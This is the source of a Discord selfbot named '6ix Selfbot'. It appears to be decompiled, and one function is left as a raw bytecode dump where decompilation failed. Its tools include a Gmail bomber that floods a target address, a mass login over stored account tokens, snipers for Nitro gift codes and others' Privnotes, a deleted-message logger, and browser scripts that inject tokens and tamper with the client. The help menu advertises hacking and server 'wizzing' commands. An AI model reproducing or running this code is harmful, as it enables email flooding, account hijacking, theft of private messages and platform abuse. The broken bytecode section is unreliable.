class SELFBOT:
    __linecount__ = 1948
    __version__ = 4.0


class SELFBOT:
    __linecount__ = 1948
    __version__ = 4.0


import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, smtplib, string, ctypes, urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging, datetime
from discord.ext import commands, tasks
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
ctypes.windll.kernel32.SetConsoleTitleW(f"[6ix Selfbot v{SELFBOT.__version__}] | Loading...")
with open('config.json') as f:
    config = json.load(f)
token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
giveaway_sniper = config.get('giveaway_sniper')
nitro_sniper = config.get('nitro_sniper')
slotbot_sniper = config.get('slotbot_sniper')
privnote_sniper = config.get('privnote_sniper')
paypalemail = config.get('paypalemail')
afk_message = config.get('afk_message')
cashappemail = config.get('cashappemail')
stream_url = config.get('stream_url')
tts_language = config.get('tts_language')
bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
r = requests.get('https://pastebin.com/e2TreA1A')
width = os.get_terminal_size().columns
loop = asyncio.get_event_loop()
b = Fore.BLACK

def startprint():
    if giveaway_sniper == True:
        giveaway = 'Active'
    else:
        giveaway = 'Disabled'
    if nitro_sniper == True:
        nitro = 'Active'
    else:
        nitro = 'Disabled'
    if slotbot_sniper == True:
        slotbot = 'Active'
    else:
        slotbot = 'Disabled'
    if privnote_sniper == True:
        privnote = 'Active'
    else:
        privnote = 'Disabled'
    serverlist = []
    for guild in SIX.guilds:
        serverlist.append(guild)
    else:
        print(f"{Fore.RESET}\n                                            \n                                                  ╔═╗  ╦  ═╗ ╦\n                                                  ╚═╗  ║  ╔╩╦╝\n                                                  ╚═╝  ╩  ╩ ╚═\n                                    {Fore.RED}═══════════════════════════════════════════\n                                    {Fore.RESET}Login: {Fore.RED}[{Fore.RED}{SIX.user.name}#{SIX.user.discriminator}{Fore.RED}]\n                                    {Fore.RESET}ID: {Fore.RED}[{Fore.RED}{SIX.user.id}{Fore.RED}]   \n                                    {Fore.RESET}Nitro:  {Fore.RED}[{Fore.RED}{Fore.RED}{nitro}{Fore.RED}] \n                                    {Fore.RESET}Giveaway: {Fore.RED}[{Fore.RED}{giveaway}{Fore.RED}]   \n                                    {Fore.RESET}SlotBot:  {Fore.RED}[{Fore.RED}{slotbot}{Fore.RED}]\n                                    {Fore.RESET}Prefix => {Fore.RED}[{prefix}]{Fore.RED}\n                                    {Fore.RESET}Servers: {Fore.RED}[{len(SIX.guilds)}]    \n                                    {Fore.RESET}6ix =>{Fore.RED}[ v{SELFBOT.__version__}] \n                                    {Fore.RESET}Developer: - {Fore.RED} [elari#0001/pix1337]  \n                                    ═══════════════════════════════════════════\n     ".replace('╔═╗  ╦  ═╗ ╦', f"{Fore.WHITE}╔═╗  ╦  ═╗ ╦{Fore.RED}").replace('╚═╝  ╩  ╩ ╚═', f"{Fore.RED}╚═╝  ╩  ╩ ╚═{Fore.RESET}").replace(' ╚═╗  ║  ╔╩╦╝', f"{Fore.RED} ╚═╗  ║  ╔╩╦╝{Fore.RESET}"))


def Clear():
    os.system('cls')


Clear()

def Init():
    if config.get('token') == 'token-here':
        Clear()
        print(f"{Fore.RESET}[ERROR] {Fore.RED}You didnt put your token in the config.json file" + Fore.RESET)
    else:
        token = config.get('token')
    try:
        SIX.run(token, bot=False, reconnect=True)
        os.system(f"title (6ix Selfbot) - Version {SELFBOT.__version__}")
    except discord.errors.LoginFailure:
        print(f"{Fore.RESET}[ERROR] {Fore.RED}this token ain't workin my guy" + Fore.RESET)
        os.system('pause >NUL')


def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access" + Fore.RESET)
    else:
        target = input('Target Gmail: ')
        message = input('Message to send: ')
        counter = eval(input('Ammount of times: '))
        count = 0
        while True:
            if count < counter:
                count = 0
                _smpt.sendmail(username, target, message)
                count += 1

        if count == counter:
            pass


async def SendWhook():
    url = ''
    whook = {'embeds': [
                {'title':'', 
                 'description':'', 
                 'thumbnail':{'url': ''}, 
                 'footer':{'text': ''}}]}
    async with aiohttp.ClientSession() as session:
        await session.post(url, json=whook)


def GenAddress(addy: str):
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    four_char = ''.join((random.choice(letters) for _ in range(4)))
    should_abbreviate = random.randint(0, 1)
    if should_abbreviate == 0:
        if 'street' in addy.lower():
            addy = addy.replace('Street', 'St.')
            addy = addy.replace('street', 'St.')
        elif 'st.' in addy.lower():
            addy = addy.replace('st.', 'Street')
            addy = addy.replace('St.', 'Street')
        if 'court' in addy.lower():
            addy = addy.replace('court', 'Ct.')
            addy = addy.replace('Court', 'Ct.')
        elif 'ct.' in addy.lower():
            addy = addy.replace('ct.', 'Court')
            addy = addy.replace('Ct.', 'Court')
        if 'rd.' in addy.lower():
            addy = addy.replace('rd.', 'Road')
            addy = addy.replace('Rd.', 'Road')
        elif 'road' in addy.lower():
            addy = addy.replace('road', 'Rd.')
            addy = addy.replace('Road', 'Rd.')
        if 'dr.' in addy.lower():
            addy = addy.replace('dr.', 'Drive')
            addy = addy.replace('Dr.', 'Drive')
        elif 'drive' in addy.lower():
            addy = addy.replace('drive', 'Dr.')
            addy = addy.replace('Drive', 'Dr.')
        if 'ln.' in addy.lower():
            addy = addy.replace('ln.', 'Lane')
            addy = addy.replace('Ln.', 'Lane')
        elif 'lane' in addy.lower():
            addy = addy.replace('lane', 'Ln.')
            addy = addy.replace('lane', 'Ln.')
    random_number = random.randint(1, 99)
    extra_list = ['Apartment', 'Unit', 'Room']
    random_extra = random.choice(extra_list)
    return four_char + ' ' + addy + ' ' + random_extra + ' ' + str(random_number)


def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token if token}
    for token in tokens:
        yield token


def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token if token}
    for token in tokens:
        yield token


class Login(discord.Client):

    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print('')
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print('-------------------------------')
        await self.logout()


def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))

    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))

    else:
        return


def async_executor():

    def outer(func):

        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = (functools.partial)(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=(message.lower()), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f"Images/{ctx.guild.id}-Dump.txt", 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices((string.ascii_letters + string.digits), k=16))
    return f"https://discord.gift/{code}"


def RandomColor():
    randcolor = discord.Color(random.randint(0, 16777215))
    return randcolor


def RandString():
    return '6ix loves you'


colorama.init()
SIX = discord.Client()
SIX = commands.Bot(description='6ix Selfbot',
  command_prefix=prefix,
  self_bot=True)
SIX.remove_command('help')

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(name=('Current BTC price: ' + value + '$ USD'),
      url='https://www.twitch.tv/pix')
    await SIX.change_presence(activity=btc_stream)


dm_log = 0

@SIX.command()
async def dlogger(message):
    global dm_log
    await message.message.delete()
    if dm_log == 0:
        dm_log += 1
        await message.send(embed=discord.Embed(title='Delete-Sniper `ON`', color=(discord.Color(random.randint(0, 16777215)))), delete_after=5)
    elif dm_log == 1:
        dm_log -= 1
        await message.send(embed=discord.Embed(title='Delete-Sniper `OFF`', color=(discord.Color(random.randint(0, 16777215)))), delete_after=5)


@SIX.event
async def on_message_delete--- This code section failed: ---

 L. 328         0  LOAD_GLOBAL              dm_log
                2  LOAD_CONST               1
                4  COMPARE_OP               ==
                6  POP_JUMP_IF_FALSE   214  'to 214'

 L. 329         8  LOAD_GLOBAL              SIX
               10  LOAD_METHOD              process_commands
               12  LOAD_FAST                'message'
               14  CALL_METHOD_1         1  ''
               16  GET_AWAITABLE    
               18  LOAD_CONST               None
               20  YIELD_FROM       
               22  POP_TOP          

 L. 330        24  SETUP_FINALLY       166  'to 166'

 L. 331        26  LOAD_FAST                'message'
               28  LOAD_ATTR                guild
               30  LOAD_CONST               None
               32  COMPARE_OP               is
               34  POP_JUMP_IF_FALSE   162  'to 162'

 L. 332        36  LOAD_FAST                'message'
               38  LOAD_ATTR                author
               40  LOAD_GLOBAL              SIX
               42  LOAD_ATTR                user
               44  COMPARE_OP               ==
               46  POP_JUMP_IF_FALSE    54  'to 54'

 L. 333        48  POP_BLOCK        
               50  LOAD_CONST               None
               52  RETURN_VALUE     
             54_0  COME_FROM            46  '46'

 L. 334        54  LOAD_GLOBAL              discord
               56  LOAD_ATTR                Embed
               58  LOAD_GLOBAL              discord
               60  LOAD_METHOD              Color
               62  LOAD_GLOBAL              random
               64  LOAD_METHOD              randint
               66  LOAD_CONST               0
               68  LOAD_CONST               16777215
               70  CALL_METHOD_2         2  ''
               72  CALL_METHOD_1         1  ''
               74  LOAD_FAST                'message'
               76  LOAD_ATTR                created_at
               78  LOAD_CONST               ('color', 'timestamp')
               80  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               82  STORE_FAST               'embed'

 L. 335        84  LOAD_FAST                'embed'
               86  LOAD_ATTR                set_image
               88  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               90  LOAD_CONST               ('url',)
               92  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               94  POP_TOP          

 L. 336        96  LOAD_FAST                'embed'
               98  LOAD_ATTR                set_author
              100  LOAD_FAST                'message'
              102  LOAD_ATTR                author
              104  FORMAT_VALUE          0  ''
              106  LOAD_FAST                'message'
              108  LOAD_ATTR                author
              110  LOAD_ATTR                avatar_url
              112  LOAD_CONST               ('name', 'url')
              114  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              116  POP_TOP          

 L. 337       118  LOAD_FAST                'embed'
              120  LOAD_ATTR                add_field
              122  LOAD_STR                 '{}'
              124  LOAD_METHOD              format
              126  LOAD_FAST                'message'
              128  LOAD_ATTR                content
              130  CALL_METHOD_1         1  ''
              132  LOAD_STR                 'l'
              134  LOAD_CONST               True
              136  LOAD_CONST               ('name', 'value', 'inline')
              138  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              140  POP_TOP          

 L. 338       142  LOAD_FAST                'message'
              144  LOAD_ATTR                channel
              146  LOAD_ATTR                send
              148  LOAD_FAST                'embed'
              150  LOAD_CONST               ('embed',)
              152  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              154  GET_AWAITABLE    
              156  LOAD_CONST               None
              158  YIELD_FROM       
              160  POP_TOP          
            162_0  COME_FROM            34  '34'
              162  POP_BLOCK        
              164  JUMP_FORWARD        214  'to 214'
            166_0  COME_FROM_FINALLY    24  '24'

 L. 339       166  DUP_TOP          
              168  LOAD_GLOBAL              Exception
              170  COMPARE_OP               exception-match
              172  POP_JUMP_IF_FALSE   210  'to 210'
              174  POP_TOP          
              176  STORE_FAST               'e'
              178  POP_TOP          
              180  SETUP_FINALLY       198  'to 198'

 L. 340       182  LOAD_GLOBAL              print
              184  LOAD_GLOBAL              str
              186  LOAD_FAST                'e'
              188  CALL_FUNCTION_1       1  ''
              190  CALL_FUNCTION_1       1  ''
              192  POP_TOP          
              194  POP_BLOCK        
              196  BEGIN_FINALLY    
            198_0  COME_FROM_FINALLY   180  '180'
              198  LOAD_CONST               None
              200  STORE_FAST               'e'
              202  DELETE_FAST              'e'
              204  END_FINALLY      
              206  POP_EXCEPT       
              208  JUMP_FORWARD        214  'to 214'
            210_0  COME_FROM           172  '172'
              210  END_FINALLY      
              212  JUMP_FORWARD        214  'to 214'
            214_0  COME_FROM           212  '212'
            214_1  COME_FROM           208  '208'
            214_2  COME_FROM           164  '164'
            214_3  COME_FROM             6  '6'

Parse error at or near `LOAD_CONST' instruction at offset 50


afk_log = 0

@SIX.command()
async def afk(message):
    global afk_log
    await message.message.delete()
    if afk_log == 0:
        afk_log += 1
        await message.send(embed=discord.Embed(title='AFK `ON`', color=(discord.Color(random.randint(0, 16777215)))), delete_after=5)
    elif afk_log == 1:
        afk_log -= 1
        await message.send(embed=discord.Embed(title='AFK `OFF`', color=(discord.Color(random.randint(0, 16777215)))), delete_after=5)


@SIX.event
async def on_message(message):
    if afk_log == 1:
        await SIX.process_commands(message)
        if message.guild is None:
            if message.author == SIX.user:
                return
            embed = discord.Embed(title='AFK Responder', description=f"Heyyy {message.author}, {afk_message}", color=(discord.Color(random.randint(0, 16777215))))
            embed.set_footer(text='6ix Selfbot <3', icon_url='https://cdn.discordapp.com/attachments/748298591243599902/749417339963047966/image0.gif')
            await message.channel.send(embed=embed)
    await SIX.process_commands(message)


@SIX.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, SIX.commandFailure):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}You're missing permission to execute this command" + Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Missing arguments: {error}" + Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Not a valid image" + Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Discord error: {error}" + Fore.RESET)
    elif 'Cannot send an empty message' in error_str:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Couldnt send a empty message" + Fore.RESET)
    else:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{error_str}" + Fore.RESET)


@SIX.event
async def on_message_edit(before, after):
    await SIX.process_commands(after)


@SIX.event
async def on_message(message):

    def GiveawayData():
        print(f"{Fore.RED} channel: {Fore.LIGHTYELLOW_EX}{message.channel}{Fore.RED} server: {Fore.LIGHTYELLOW_EX}{message.guild}" + Fore.RESET)

    def SlotBotData():
        print(f"{Fore.RED} channel: {Fore.LIGHTYELLOW_EX}{message.channel}{Fore.RED} server: {Fore.LIGHTYELLOW_EX}{message.guild}" + Fore.RESET)

    def NitroData(elapsed, code):
        print(f"{Fore.RED}channel: {Fore.LIGHTYELLOW_EX}{message.channel}{Fore.RED}  server: {Fore.LIGHTYELLOW_EX}{message.guild}{Fore.RED}  sender: {Fore.LIGHTYELLOW_EX}{message.author}\n{Fore.RED}speed: {Fore.LIGHTYELLOW_EX}{elapsed}{Fore.RED} nitro: {Fore.LIGHTYELLOW_EX}https://discord.gift/{code}" + Fore.RESET)

    def PrivnoteData(code):
        print(f"{Fore.RED} channel: {Fore.LIGHTYELLOW_EX}{message.channel}{Fore.RED} server: {Fore.LIGHTYELLOW_EX}{message.guild}\n{Fore.RED} message: {Fore.LIGHTYELLOW_EX}[The content can be found at Privnote/{code}.txt]" + Fore.RESET)

    time = datetime.datetime.now().strftime('%H:%M %p')
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search('discord.gift/(.*)', message.content).group(1)
            token = config.get('token')
            headers = {'Authorization': token}
            r = requests.post(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem",
              headers=headers).text
            elapsed = datetime.datetime.now() - start
            elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
            if 'This gift has been redeemed already.' in r:
                print(f"{Fore.RED}it has already been redeemed dropped at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                NitroData(elapsed, code)
            elif 'subscription_plan' in r:
                print(f"{Fore.RED}Nitro grabbed at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                NitroData(elapsed, code)
            elif 'Unknown Gift Code' in r:
                print(f"{Fore.RED}Nitro code has been dropped at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(f"\n{Fore.RED}was unable to grab slotbot at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                    SlotBotData()
                else:
                    print(f"\n{Fore.RED}You grabbed slotbot at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                    SlotBotData()
        else:
            return
    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction('🎉')
                except discord.errors.Forbidden:
                    print(f"{Fore.RED}Unable to react at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                    GiveawayData()
                else:
                    print(f"{Fore.RED}You reacted to it at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                    GiveawayData()
        else:
            return
    if f"Congratulations <@{SIX.user.id}>" in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                print(f"{Fore.RED}You won the giveaway at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                GiveawayData()
        else:
            return
    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/' + code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                try:
                    print(e)
                finally:
                    e = None
                    del e

            else:
                with open(f"Privnote/{code}.txt", 'a+') as f:
                    print(f"\n{Fore.RED}Privnote grabbed at{Fore.LIGHTYELLOW_EX} {time}" + Fore.RESET)
                    PrivnoteData(code)
                    f.write(note_text)
        else:
            return
    await SIX.process_commands(message)


@SIX.event
async def on_connect():
    Clear()
    if giveaway_sniper == True:
        giveaway = 'Active'
    else:
        giveaway = 'Disabled'
    if nitro_sniper == True:
        nitro = 'Active'
    else:
        nitro = 'Disabled'
    if slotbot_sniper == True:
        slotbot = 'Active'
    else:
        slotbot = 'Disabled'
    if privnote_sniper == True:
        privnote = 'Active'
    else:
        privnote = 'Disabled'
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f"[SIX Selfbot v{SELFBOT.__version__}] | Logged in as {SIX.user.name}")


@SIX.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠﾠ')


@SIX.command()
async def genname(ctx):
    await ctx.message.delete()
    first, second = random.choices((ctx.guild.members), k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))


@SIX.command()
async def login(ctx, _token):
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }   \n            '
    driver.get('https://discordapp.com/login')
    driver.execute_script(script + f'\nlogin("{_token}")')


@SIX.command()
async def botlogin(ctx, _token):
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = "\n    function login(token) {\n      ((i) => {\n        window.webpackJsonp.push([  \n          [i], {\n            [i]: (n, b, d) => {\n              let dispatcher;\n              for (let key in d.c) {\n                if (d.c[key].exports) {\n                  const module = d.c[key].exports.default || d.c[key].exports;\n                  if (typeof(module) === 'object') {\n                    if ('setToken' in module) {\n                      module.setToken(token);\n                      module.hideToken = () => {};\n                    }\n                    if ('dispatch' in module && '_subscriptions' in module) {\n                      dispatcher = module;\n                    }\n                    if ('AnalyticsActionHandlers' in module) {\n                      console.log('AnalyticsActionHandlers', module);\n                      module.AnalyticsActionHandlers.handleTrack = (track) => {};\n                    }\n                  } else if (typeof(module) === 'function' && 'prototype' in module) {\n                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);\n                    if ('_discoveryFailed' in descriptors) {\n                      const connect = module.prototype._connect;\n                      module.prototype._connect = function(url) {\n                        console.log('connect', url);\n                        const oldHandleIdentify = this.handleIdentify;\n                        this.handleIdentify = () => {\n                          const identifyData = oldHandleIdentify();\n                          identifyData.token = identifyData.token.split(' ').pop();\n                          return identifyData;\n                        };\n                        const oldHandleDispatch = this._handleDispatch;\n                        this._handleDispatch = function(data, type) {\n                          if (type === 'READY') {\n                            console.log(data);\n                            data.user.bot = false;\n                            data.user.email = '6ix-Was-Here@Fuckyou.com';\n                            data.analytics_tokens = [];\n                            data.connected_accounts = [];\n                            data.consents = [];\n                            data.experiments = [];\n                            data.guild_experiments = [];\n                            data.relationships = [];\n                            data.user_guild_settings = [];\n                          }\n                          return oldHandleDispatch.call(this, data, type);\n                        }\n                        return connect.call(this, url);\n                      };\n                    }\n                  }\n                }\n              }\n              console.log(dispatcher);\n              if (dispatcher) {\n                dispatcher.dispatch({\n                  type: 'LOGIN_SUCCESS',\n                  token\n                });\n              }\n            },\n          },\n          [\n            [i],\n          ],\n        ]);\n      })(Math.random());\n    }\n    "
    driver.get('https://discordapp.com/login')
    driver.execute_script(script + f'\nlogin("Bot {_token}")')


@SIX.command()
async def address(ctx, *, text):
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while True:
        if i < 10:
            address_array.append(GenAddress(addy))
            i += 1

    final_str = '\n'.join(address_array)
    em = discord.Embed(description=final_str, color=(discord.Color(random.randint(0, 16777215))))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)


@SIX.command()
async def help(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='H̶E̶L̶P̶ ̶C̶O̶M̶M̶A̶N̶D̶', description='', color=0)
    em.add_field(name='`ＨΞＬＰ\u3000（以駅り）`', value='H̶E̶L̶P̶ ̶C̶O̶M̶M̶A̶N̶D̶', inline=False)
    em.add_field(name='`ＣＭＤ\u3000（ゅクギ）`', value='I̶M̶P̶O̶R̶T̶A̶N̶T̶ ̶C̶O̶M̶M̶A̶N̶D', inline=False)
    em.add_field(name='`ＮＳＦＷ\u3000（者夜臆）`', value='1̶8̶+̶ ', inline=False)
    em.add_field(name='`ΛＭＣ\u3000（沿オ ）`', value='F̶O̶R̶ ̶Y̶O̶U̶R̶ ̶A̶C̶C̶O̶U̶N̶T̶`', inline=False)
    em.add_field(name='`ＵＴＩＬ\u3000（ッゃへ）`', value='`F̶O̶R̶ ̶S̶E̶R̶V̶E̶R̶``', inline=False)
    em.add_field(name='`ＦＵＮ\u3000（を蒸・）`', value='F̶U̶N̶ ̶C̶O̶M̶M̶A̶N̶D̶', inline=False)
    em.add_field(name='`ＨΛＣＫＩＮＧ\u3000（員右う）`', value='H̶A̶C̶K̶I̶N̶G̶ ̶C̶O̶M̶M̶A̶N̶D̶', inline=False)
    em.add_field(name='`ＷＩＺＺＩＮＧ\u3000（ぶ育ぞ）`', value='S̶E̶R̶V̶E̶R̶ ̶W̶I̶Z̶Z̶', inline=False)
    em.add_field(name='`𝐏𝐑𝐎𝐉𝐄𝐂𝐓 𝟔𝐈𝐗`', value='6̶i̶x̶ ̶o̶n̶ ̶t̶o̶p̶', inline=False)
    em.add_field(name='`𝐕𝐀𝐋𝐈𝐃`', value='v̶a̶l̶i̶d̶', inline=False)
    em.add_field(name='`𝐌𝐀𝐓𝐇`', value='m̶a̶t̶h̶ ̶t̶o̶o̶l̶s̶', inline=False)
    em.add_field(name='`𝐦𝐨𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐬𝐨𝐨𝐧`', value='6̶i̶x̶ ̶l̶o̶v̶e̶s̶ ̶y̶o̶u̶', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def cmd(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='I̶M̶P̶O̶R̶T̶A̶N̶T̶ ̶C̶O̶M̶M̶A̶N̶D', description='', color=0)
    em.set_author(name='𝐂𝐌𝐃')
    em.add_field(name='`𝐚𝐝𝐦𝐢𝐧`', value='Shows How Many Admin You Have In Servers', inline=False)
    em.add_field(name='`𝐮𝐫𝐛𝐚𝐧`', value='urbans anything bruh', inline=False)
    em.add_field(name='`𝐛𝐨𝐨𝐬𝐭`', value='boost the server 600 times', inline=False)
    em.add_field(name='`𝐜𝐨𝐯𝐢𝐝`', value='shows the cases of covid-19', inline=False)
    em.add_field(name='`𝐭𝐢𝐧𝐝𝐞𝐫`', value='Tinder match the perons u mention', inline=False)
    em.add_field(name='`𝐧𝐢𝐭𝐫𝐨𝐨𝐧`', value='Nitro mode on', inline=False)
    em.add_field(name='`𝐧𝐢𝐭𝐫𝐨𝐨𝐟𝐟`', value='Nitro mode off', inline=False)
    em.add_field(name='`𝐚𝐛𝐨𝐮𝐭`', value='Shows About The Selfbot', inline=False)
    em.add_field(name='`𝐯𝐩𝐧`', value='6ix Personal VPN xd', inline=False)
    em.add_field(name='`𝐬𝐩𝐚𝐦𝐠𝐜𝐧𝐚𝐦𝐞`', value='Spams The Gc name to 6IX ON TOP', inline=False)
    em.add_field(name='`𝐢𝐧𝐟𝐨`', value='Shows info about the mention user', inline=False)
    em.add_field(name='`𝐚𝐯`', value='Displays the profile picture of the mentioned user', inline=False)
    em.add_field(name='`𝐫𝐞𝐯𝐚𝐯`', value='Reverse avatar the mentioned user profile picture', inline=False)
    em.add_field(name='`𝐰𝐡𝐨𝐢𝐬`', value='Displays discord information of the mentioned user', inline=False)
    em.add_field(name='`𝐫𝐨𝐥𝐞-𝐡𝐞𝐱𝐜𝐨𝐝`', value='Displays the hexcode of the specified role', inline=False)
    em.add_field(name='`𝐠𝐮𝐢𝐥𝐝𝐢𝐜𝐨𝐧`', value='Display guild icon', inline=False)
    em.add_field(name='`𝐫𝐨𝐥𝐞𝐢𝐧𝐟𝐨`', value='Display some info about the specified role', inline=False)
    em.add_field(name='`𝐜𝐥𝐬`', value='Clears your console fully', inline=False)
    em.add_field(name='`𝐥𝐨𝐠𝐨𝐮𝐭`', value='Logs you out the selfbot', inline=False)
    em.add_field(name='`𝐝𝐦`', value='Sends a message to the specified user', inline=False)
    em.add_field(name='`𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞`', value='Glitched way to mention everyone in a server', inline=False)
    em.add_field(name='`𝐞𝐦𝐩𝐭𝐲`', value='Sends a empty message', inline=False)
    em.add_field(name='`𝐠𝐞𝐭-𝐡𝐰𝐢𝐝`', value='Prints your hwid in the console', inline=False)
    em.add_field(name='`𝐬𝐞𝐜𝐫𝐞𝐭`', value='Returns the message but hidden ||hidden||', inline=False)
    em.add_field(name='`𝐛𝐨𝐥𝐝`', value='Returns the message but **bold**', inline=False)
    em.add_field(name='`𝐫𝐞𝐯𝐞𝐫𝐬𝐞`', value='Reverses ur message', inline=False)
